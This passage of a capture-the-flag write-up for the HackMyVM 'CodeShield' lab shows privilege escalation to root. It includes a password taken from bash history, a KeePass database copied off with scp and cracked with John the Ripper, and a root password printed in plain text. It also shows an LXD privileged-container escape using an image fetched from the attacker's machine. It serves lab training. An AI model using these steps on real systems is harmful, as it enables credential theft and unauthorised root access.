We could capture the user flag within the home directory of the user `mitchellt`. 

Since we did read the email from Thomas Mitchell we know that Patrick did something under his account. we should look into the history of bash to see what Patrick did.


```bash
mitchellt@codeshield:/home/valdezk$ history
    1  echo 'EARL!YP7DeVel@OP'| su - earlyp -c "cp -r /home/earlyp/Development/mining ."
    2  echo 'EARL!YP7DeVel@OP'| su - earlyp -c "cp -r /home/earlyp/Development/mining /tmp"
    3  cp -r /tmp/mining .
    4  ls
    5  cd mining/
    6  ls
    7  exit
    8  history

```
Based on the history we can see that Patrick tried to copy something to the directory of Thomas. Patrick did make a big mistake by entering his password in the prompt so he did not have to enter it again. Let's add the password to our notes.

```
EARL!YP7DeVel@OP
```

With this new password we could try to switch user as `earlyp`.

```bash
mitchellt@codeshield:/home/valdezk$ su earlyp
Password: 
earlyp@codeshield:/home/valdezk$ 
```
This worked as well, now let's check the home directory for sensitive files.
```bash
earlyp@codeshield:/home/valdezk$ cd ~
earlyp@codeshield:~$ ls -la
total 116
drwxr-x--- 19 earlyp earlyp 4096 Aug 29 06:22 .
drwxr-xr-x 14 root   root   4096 Aug 26 20:56 ..
-rw-------  1 earlyp earlyp   36 Aug 29 06:20 .bash_history
-rw-r--r--  1 earlyp earlyp  220 Jan  6  2022 .bash_logout
-rw-r--r--  1 earlyp earlyp 3771 Jan  6  2022 .bashrc
drwx------ 12 earlyp earlyp 4096 Aug 23 12:44 .cache
drwx------ 16 earlyp earlyp 4096 Aug 28 17:36 .config
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22 20:05 Desktop
drwxrwxr-x  3 earlyp earlyp 4096 Aug 28 20:45 Development
drwxr-xr-x  2 earlyp earlyp 4096 Aug 28 17:42 Documents
drwxr-xr-x  5 earlyp earlyp 4096 Aug 23 10:03 Downloads
drwx------  2 earlyp earlyp 4096 Aug 28 17:35 .gnupg
drwx------  3 earlyp earlyp 4096 Aug 22 20:05 .local
drwxrwxr-x  6 earlyp earlyp 4096 Aug 29 06:22 mining
drwxrwxr-x  2 earlyp earlyp 4096 Aug 23 11:29 .mono
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22 20:05 Music
drwxr-xr-x  3 earlyp earlyp 4096 Aug 23 10:02 Pictures
-rw-r--r--  1 earlyp earlyp  807 Jan  6  2022 .profile
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22 20:05 Public
-rw-rw-r--  1 earlyp earlyp  233 Aug 23 12:30 .recently-used
drwx------  3 earlyp earlyp 4096 Aug 22 20:56 snap
drwx------  2 earlyp earlyp 4096 Aug 22 21:10 .ssh
-rw-r--r--  1 earlyp earlyp    0 Aug 22 19:39 .sudo_as_admin_successful
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22 20:05 Templates
-rw-r-----  1 earlyp earlyp    6 Aug 28 20:56 .vboxclient-clipboard-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28 20:56 .vboxclient-draganddrop-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28 20:56 .vboxclient-hostversion-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28 20:56 .vboxclient-seamless-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28 20:56 .vboxclient-vmsvga-session-tty2-control.pid
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22 20:05 Videos
earlyp@codeshield:~$ cd Documents/
earlyp@codeshield:~/Documents$ ls -la
total 12
drwxr-xr-x  2 earlyp earlyp 4096 Aug 28 17:42 .
drwxr-x--- 19 earlyp earlyp 4096 Aug 29 06:22 ..
-rw-------  1 earlyp earlyp 1918 Aug 28 17:42 Passwords.kdbx
earlyp@codeshield:~/Documents$ 

```
There is one file interesting for now: `Passwords.kdbx`.
We should try to copy this file to our Kali and try to crack the file.
```bash
earlyp@codeshield:~/Documents$ pwd
/home/earlyp/Documents
```

To copy the file to our working directory we could utilize the tool `scp`. The file location should be known as well. Therefor we can use the command `pwd`.
```bash
earlyp@codeshield:~/Documents$ pwd
/home/earlyp/Documents
```

----
## Get the root flag

Now we can copy the file from our victim to our Kali machine. We know the password for the user `earlyp`, the file and the location where the file is stored.
```bash
scp -P 22222 earlyp@$ip:/home/earlyp/Documents/Passwords.kdbx /home/emvee/Documents/HMV/CodeShield/Passwords.kdbx
```
![Image](/assets/img/WriteUp/HackMyVM/CodeShield/Pasted image 20230830133509.png){: width="700" height="400" }

As soon as the file has been copied to our working directory we can try to crack the password hash of the file. To crack the password hash we should extract the hash so we can crack it with John The Ripper.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield]
└─$ keepass2john Passwords.kdbx> keepasshash.txt 
```
Now let's crack the hash with the wordlist we have created before.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield]
└─$ john --wordlist=wordlist.txt keepasshash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 3225806 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mandalorian      (Passwords)     
1g 0:00:00:23 DONE (2023-08-30 13:36) 0.04327g/s 4.154p/s 4.154c/s 4.154C/s macewindu..Venom
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

So we have found a new password, but this time it should work on the password manager database. We should add the password to our notes as well.
```PASSWORD
mandalorian
```
Since keepassxc is not default on Kali installed we should install it.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield]
└─$ sudo apt-get install keepassxc
```
As soon as keepassxc is installed we can open the password manager database.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield]
└─$ keepassxc Passwords.kdbx 
```
Now we should be able to enter the password within the GUI and inspect the database.
![Image](/assets/img/WriteUp/HackMyVM/CodeShield/Pasted image 20230830134123.png){: width="700" height="400" }

There is one account available in the password manager database. We are able to see the password of the root account what could be used to logon to the SSH service according the notes.
![Image](/assets/img/WriteUp/HackMyVM/CodeShield/Pasted image 20230830134158.png){: width="700" height="400" }

Since we discovered a new password, we should add it to our notes.
```
7%z5,c9=w6[x8=
```
Now let's logon to the correct SSH service with the root password
![Image](/assets/img/WriteUp/HackMyVM/CodeShield/Pasted image 20230830134251.png){: width="700" height="400" }


Since we are root we can capture thew root flag.

![Image](/assets/img/WriteUp/HackMyVM/CodeShield/Pasted image 20230830134308.png){: width="700" height="400" }



-----
## Alternative Privilege Escalation

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield]
└─$ git clone  https://github.com/saghul/lxd-alpine-builder.git
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 50, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42
Receiving objects: 100% (50/50), 3.11 MiB | 7.16 MiB/s, done.
Resolving deltas: 100% (15/15), done.
```

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield]
└─$ cd lxd-alpine-builder
```

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield/lxd-alpine-builder]
└─$ sudo ./build-alpine    
[sudo] password for emvee: 
Determining the latest release... v3.18
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.18/main/x86_64
Downloading alpine-keys-2.4-r1.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading apk-tools-static-2.14.0-r2.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: OK
Verified OK
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2653  100  2653    0     0   3652      0 --:--:-- --:--:-- --:--:--  3654
--2023-09-20 23:02:15--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
Resolving alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 93.187.10.106, 2a00:1f00:dc06:10::106
Connecting to alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|93.187.10.106|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2653 (2.6K) [text/plain]
Saving to: ‘/home/emvee/Documents/HMV/CodeShield/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’

/home/emvee/Documents/HMV/CodeShield/lxd-alpine-builder/ro 100%[========================================================================================================================================>]   2.59K  --.-KB/s    in 0s      

2023-09-20 23:02:15 (382 MB/s) - ‘/home/emvee/Documents/HMV/CodeShield/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved [2653/2653]

Selecting mirror http://dl-cdn.alpinelinux.org/alpine//v3.18/main
fetch http://dl-cdn.alpinelinux.org/alpine//v3.18/main/x86_64/APKINDEX.tar.gz
(1/25) Installing alpine-baselayout-data (3.4.3-r1)
(2/25) Installing musl (1.2.4-r1)
(3/25) Installing busybox (1.36.1-r2)
Executing busybox-1.36.1-r2.post-install
(4/25) Installing busybox-binsh (1.36.1-r2)
(5/25) Installing alpine-baselayout (3.4.3-r1)
Executing alpine-baselayout-3.4.3-r1.pre-install
Executing alpine-baselayout-3.4.3-r1.post-install
(6/25) Installing ifupdown-ng (0.12.1-r2)
(7/25) Installing libcap2 (2.69-r0)
(8/25) Installing openrc (0.48-r0)
Executing openrc-0.48-r0.post-install
(9/25) Installing mdev-conf (4.5-r0)
(10/25) Installing busybox-mdev-openrc (1.36.1-r2)
(11/25) Installing alpine-conf (3.16.2-r0)
(12/25) Installing alpine-keys (2.4-r1)
(13/25) Installing alpine-release (3.18.3-r0)
(14/25) Installing ca-certificates-bundle (20230506-r0)
(15/25) Installing libcrypto3 (3.1.2-r0)
(16/25) Installing libssl3 (3.1.2-r0)
(17/25) Installing ssl_client (1.36.1-r2)
(18/25) Installing zlib (1.2.13-r1)
(19/25) Installing apk-tools (2.14.0-r2)
(20/25) Installing busybox-openrc (1.36.1-r2)
(21/25) Installing busybox-suid (1.36.1-r2)
(22/25) Installing scanelf (1.3.7-r1)
(23/25) Installing musl-utils (1.2.4-r1)
(24/25) Installing libc-utils (0.7.2-r5)
(25/25) Installing alpine-base (3.18.3-r0)
Executing busybox-1.36.1-r2.trigger
OK: 10 MiB in 25 packages

```

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield/lxd-alpine-builder]
└─$ ll                                            
total 10656
-rw-r--r-- 1 emvee emvee 3259593 Sep 20 23:01 alpine-v3.13-x86_64-20210218_0139.tar.gz
-rw-r--r-- 1 root  root  3804378 Sep 20 23:02 alpine-v3.18-x86_64-20230920_2302.tar.gz
-rw-r--r-- 1 root  root  3804503 Sep 20 23:09 alpine-v3.18-x86_64-20230920_2309.tar.gz
-rwxr-xr-x 1 emvee emvee    8060 Sep 20 23:01 build-alpine
-rw-r--r-- 1 emvee emvee   26530 Sep 20 23:01 LICENSE
-rw-r--r-- 1 emvee emvee     768 Sep 20 23:01 README.md
```

```
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield/lxd-alpine-builder]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

```bash
earlyp@codeshield:~$ wget http://10.0.2.15/alpine-v3.18-x86_64-20230920_2309.tar.gz
--2023-09-20 21:10:20--  http://10.0.2.15/alpine-v3.18-x86_64-20230920_2309.tar.gz
Connecting to 10.0.2.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3804503 (3.6M) [application/gzip]
Saving to: ‘alpine-v3.18-x86_64-20230920_2309.tar.gz’

alpine-v3.18-x86_64-20230920_2309.tar.gz                   100%[========================================================================================================================================>]   3.63M  --.-KB/s    in 0.01s   

2023-09-20 21:10:20 (253 MB/s) - ‘alpine-v3.18-x86_64-20230920_2309.tar.gz’ saved [3804503/3804503]
```

```bash
earlyp@codeshield:~$ lxc image import ./alpine-v3.18-x86_64-20230920_2309.tar.gz --alias emvee
Image imported with fingerprint: 2ccaead59119c4bdcfa3db5e7ae9e71491e92bd3381f169e5d8915e4492e6bd3
```

```bash
earlyp@codeshield:~$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]:  
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: 
Name of the storage backend to use (lvm, zfs, btrfs, ceph, cephobject, dir) [default=zfs]: 
Create a new ZFS pool? (yes/no) [default=yes]: 
Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]: 
Size in GiB of the new loop device (1GiB minimum) [default=9GiB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like the LXD server to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes]: 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
```

```bash
earlyp@codeshield:~$ lxc init myimage mycontainer -c security.privileged=true
Creating mycontainer
```

```bash
earlyp@codeshield:~$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to mycontainer
```

```bash
earlyp@codeshield:~$ lxc start mycontainer
```

```bash
earlyp@codeshield:~$ lxc exec mycontainer /bin/sh
```

```bash
~ # cd /mnt/root
/mnt/root # ls
bin         dev         home        lib32       libx32      media       opt         root        sbin        srv         sys         usr
boot        etc         lib         lib64       lost+found  mnt         proc        run         snap        swap.img    tmp         var
/mnt/root # ls root
cowrie    root.txt  snap
/mnt/root # cat root/root.txt 

```




